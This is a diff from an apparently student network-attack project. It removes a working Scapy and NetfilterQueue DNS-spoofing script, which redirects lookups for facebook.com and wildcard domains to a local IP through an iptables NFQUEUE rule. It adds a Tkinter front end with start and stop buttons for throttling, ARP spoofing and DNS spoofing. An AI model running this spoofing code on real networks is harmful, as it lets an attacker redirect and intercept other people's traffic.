@@ -1,52 +1,39 @@
-#importing modules
-import scapy.all as scapy
-from netfilterqueue import NetfilterQueue
-import os
+import tkinter as tk
+win=tk.Tk()
+l1=tk.Label(text="SASTRA UNIVERSITY")
+l1.pack()
+l2=tk.Label(text="DNS SPOOFING AND NETWORK THROTTLING")
+l2.pack()
+k1=tk.Label(text="Host IP:")
+k1.pack()
+e1=tk.Entry()
+e1.pack()
 
-# creating dictionary
-hosts = {
-    b"www.*.": "10.0.2.15",
-    b"*.com": "10.0.2.15",
-    b"facebook.com.": "10.0.2.15"
-}
+k2=tk.Label(text="GateWay")
+k2.pack()
+e2=tk.Entry()
+e2.pack()
 
-#function for handling user input
-def pkt_process(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.DNSRR):
+t1=tk.Label(text="network throttling:")
+t1.pack()
+b1=tk.Button(text="Start")
+b2=tk.Button(text="Stop")
+b1.pack()
+b2.pack()
+t2=tk.Label(text="ARP Spoofing:")
+t2.pack()
+b3=tk.Button(text="Start")
+b4=tk.Button(text="Stop")
+b3.pack()
+b4.pack()
+t3=tk.Label(text="DNS Spoofing:")
+t3.pack()
+b5=tk.Button(text="Start")
+b6=tk.Button(text="Stop")
+b5.pack()
+b6.pack()
 
-        print("[Before Modification ]:", scapy_packet.summary())
-        try:
-            scapy_packet = modify_packet(scapy_packet)
-        except IndexError:
-            pass
-        print("[After Modification ]:", scapy_packet.summary())
-        packet.set_payload(bytes(scapy_packet))
-    # accepting packets    
-    packet.accept()
-
-# function for modification of packets
-def modify_packet(packet):
-    qname = packet[scapy.DNSQR].qname
-    if qname not in hosts:
-        print("Invalid DNS Host:", qname)
-        return packet
-    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=hosts[qname])
-    packet[scapy.DNS].ancount = 1
-    
-    #deleting some fields
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.UDP].len
-    del packet[scapy.UDP].chksum
-
-    return packet
-QUEUE_NUM = 123
-# insert the iptables FORWARD rule
-os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
-q = NetfilterQueue()
-try:
-    q.bind(QUEUE_NUM, pkt_process)
-    q.run()
-except KeyboardInterrupt:
-    os.system("iptables --flush")
+name=tk.Label(text="R.Chandrakumar")
+name.pack()
+win.minsize(400,400)
+win.mainloop()
